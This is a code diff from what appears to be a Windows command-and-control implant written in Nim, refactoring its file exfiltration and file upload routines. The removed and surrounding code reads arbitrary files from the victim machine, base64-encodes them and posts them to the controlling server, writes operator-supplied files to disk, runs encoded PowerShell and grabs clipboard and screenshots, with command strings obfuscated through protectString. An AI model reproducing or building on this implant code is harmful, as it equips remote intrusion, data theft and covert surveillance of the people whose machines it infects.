@@ -21,8 +21,6 @@ proc windows_parse_command*(command: JsonNode): bool
 # Command executors
 proc collect_data(): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
-proc exfil_file(file_path: string): bool
-proc write_file(file_data_base64: string, file_path: string): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc wrap_get_screenshot(): bool
@@ -135,50 +133,6 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
             "output": output
         }.toOrderedTable()
         is_success = post_data(client, ps_module, $data)
-
-    return is_success
-
-
-proc exfil_file(file_path: string): bool = 
-    var is_success: bool
-    var file_content_base64: string
-
-    try:
-        file_content_base64 = encode_64(readFile(file_path), is_bin=true)
-        is_success = true
-    except:
-        file_content_base64 = could_not_retrieve
-        is_success = false
-    
-    var data = {
-        "is_success": $is_success,
-        "file_path": file_path,
-        protectString("file_content_base64"): file_content_base64
-    }.toOrderedTable()
-    
-    is_success = post_data(client, protectString("download") , $data)
-
-    return is_success
-
-
-proc write_file(file_data_base64: string, file_path: string): bool =
-    var is_success: bool
-    var f = newFileStream(file_path, fmWrite)
-    
-    if isNil(f):
-        is_success = false
-    else:
-        var file_data = decode_64(file_data_base64, is_bin=true)
-        f.write(file_data)
-        f.close()
-        is_success = true
-    
-    var data = {
-        "is_success": $is_success,
-        protectString("file_upload_path"): file_path,
-    }.toOrderedTable()
-    
-    is_success = post_data(client, protectString("upload") , $data)
 
     return is_success
 
@@ -601,9 +555,9 @@ proc windows_parse_command*(command: JsonNode): bool =
             else:
                 is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command["ps_module"].getStr())
         of protectString("download"):
-            is_success = exfil_file(command["src_file"].getStr())
+            is_success = exfil_file(client, command["src_file"].getStr())
         of protectString("upload"):
-            is_success = write_file(command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr())            
+            is_success = write_file(client, command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr())            
         of protectString("checksec"):
             is_success = checksec()
         of protectString("clipboard"):
